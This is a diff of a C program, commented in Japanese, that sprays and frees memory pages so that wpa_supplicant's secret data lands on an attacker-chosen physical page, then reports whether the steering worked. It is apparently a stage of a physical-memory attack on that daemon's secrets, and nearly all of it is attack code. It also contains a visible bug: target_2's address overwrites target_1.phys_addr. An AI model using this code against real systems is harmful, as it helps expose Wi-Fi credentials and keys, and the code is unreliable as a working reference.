@@ -6,7 +6,7 @@
 #include <sys/mman.h>
 #include <stdlib.h>
 
-static const int DUMMY_PAGE = 300;
+static const int DUMMY_PAGE = 189;
 static const int BUSY_LOOP = 5;
 static const int PFN_MASK_SIZE = 8;
 
@@ -14,17 +14,20 @@ int main() {
     // ダミーページ確保
     dummy dummy_pages[DUMMY_PAGE];
     for (int i = 0; i < DUMMY_PAGE; i++) {
-        dummy_pages[i].virt_addr = mmap(
-            NULL,
-            0x1000,
-            PROT_READ | PROT_WRITE,
-            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
-            -1,
-            0
-        );
+        dummy_pages[i].virt_addr = custom_mmap();
         if (dummy_pages[i].virt_addr == MAP_FAILED) continue;
         dummy_pages[i].phys_addr = v2p(0, dummy_pages[i].virt_addr);
     }
+
+    // ターゲットページを確保
+    dummy target_1;
+    dummy target_2;
+
+    target_1.virt_addr = custom_mmap();
+    target_1.phys_addr = v2p(0, target_1.virt_addr);
+    
+    target_2.virt_addr = custom_mmap();
+    target_1.phys_addr = v2p(0, target_2.virt_addr);
 
     // wpa_supplicant が起動中なら一度止める
     int res = 0;
@@ -41,6 +44,10 @@ int main() {
         sched_yield();
     }
 
+    // ターゲットページ解放
+    munmap(target_1.virt_addr, 0x1000);
+    munmap(target_2.virt_addr, 0x1000);
+
     // ダミーページ解放
     for (int i = 0; i < DUMMY_PAGE; i++) {
         munmap(dummy_pages[i].virt_addr, 0x1000);
@@ -51,6 +58,7 @@ int main() {
         printf("[-] failed to start wpa_supplicant\n");
         exit(1);
     }
+    printf("[+] start wpa_supplicant\n");
 
     // wpa_supplicant が秘密情報を配置するまで待機
     busy_loop(BUSY_LOOP);
@@ -68,12 +76,33 @@ int main() {
     printf("[+] physical address = 0x%lx\n", phys_addr);
 
     // ダミーページ計算
-    for (int index = 0; index < DUMMY_PAGE; index++) {
-        if (dummy_pages[index].phys_addr == phys_addr) {
-            printf("[+] dummy page is %d\n", DUMMY_PAGE - index - 1);
-            break;
-        }
+    // for (int index = 0; index < DUMMY_PAGE; index++) {
+    //     if (dummy_pages[index].phys_addr == phys_addr) {
+    //         printf("[+] index = %d, dummy page is %d\n", index, DUMMY_PAGE - index - 1);
+    //         break;
+    //     }
+    // }
+    
+    // ページの誘導に成功したか確認
+    if (phys_addr == target_1.phys_addr) {
+        printf("[+] successfully lead to the target page1\n");
+    } else if (phys_addr == target_2.phys_addr) {
+        printf("[+] successfully lead to the target page2\n");
+    } else {
+        printf("[-] failed lead to the target page\n");
     }
 
     return 0;
+}
+
+void *custom_mmap() {
+    void *addr = mmap(
+        NULL,
+        0x1000,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
+        -1,
+        0
+    );
+    return addr;
 }
